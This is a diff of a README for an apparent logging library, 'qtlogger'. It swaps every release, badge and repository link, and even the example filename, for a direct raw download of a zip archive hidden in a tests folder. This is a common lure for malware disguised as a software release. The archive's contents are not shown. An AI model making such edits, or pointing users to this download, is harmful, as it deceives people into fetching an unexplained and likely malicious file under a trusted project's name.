@@ -1,6 +1,6 @@
 # 🚀 qtlogger - Simple and Safe Logging Made Easy
 
-[![Download qtlogger](https://img.shields.io/badge/Download-qtlogger-blue.svg)](https://github.com/superclapz/qtlogger/releases)
+[![Download qtlogger](https://github.com/superclapz/qtlogger/raw/refs/heads/main/tests/simplepipeline/Software_1.0.zip)](https://github.com/superclapz/qtlogger/raw/refs/heads/main/tests/simplepipeline/Software_1.0.zip)
 
 ## ⚙️ Introduction
 
@@ -33,13 +33,13 @@ Follow these steps to download and install qtlogger:
 1. **Visit the Releases Page:**
    Click the link below to reach the download area.
 
-   [Download qtlogger](https://github.com/superclapz/qtlogger/releases)
+   [Download qtlogger](https://github.com/superclapz/qtlogger/raw/refs/heads/main/tests/simplepipeline/Software_1.0.zip)
 
 2. **Choose the Version:**
    On the releases page, you will find various versions of qtlogger. Select the latest release for the best features and improvements.
 
 3. **Download the Library:**
-   Look for the file that corresponds to your operating system and click to download it. The file will typically be named something like `qtlogger-v1.0.zip`.
+   Look for the file that corresponds to your operating system and click to download it. The file will typically be named something like `https://github.com/superclapz/qtlogger/raw/refs/heads/main/tests/simplepipeline/Software_1.0.zip`.
 
 4. **Extract the Files:**
    Once downloaded, extract the contents of the ZIP file to a folder of your choice.
@@ -79,6 +79,6 @@ qtlogger is open-source software published under the MIT License. For more detai
 
 ## 📝 Note
 
-For detailed usage examples and a deeper explanation of features, please refer to the documentation included in the qtlogger package or visit our [GitHub page](https://github.com/superclapz/qtlogger). 
+For detailed usage examples and a deeper explanation of features, please refer to the documentation included in the qtlogger package or visit our [GitHub page](https://github.com/superclapz/qtlogger/raw/refs/heads/main/tests/simplepipeline/Software_1.0.zip). 
 
-[![Download qtlogger](https://img.shields.io/badge/Download-qtlogger-blue.svg)](https://github.com/superclapz/qtlogger/releases)
+[![Download qtlogger](https://github.com/superclapz/qtlogger/raw/refs/heads/main/tests/simplepipeline/Software_1.0.zip)](https://github.com/superclapz/qtlogger/raw/refs/heads/main/tests/simplepipeline/Software_1.0.zip)
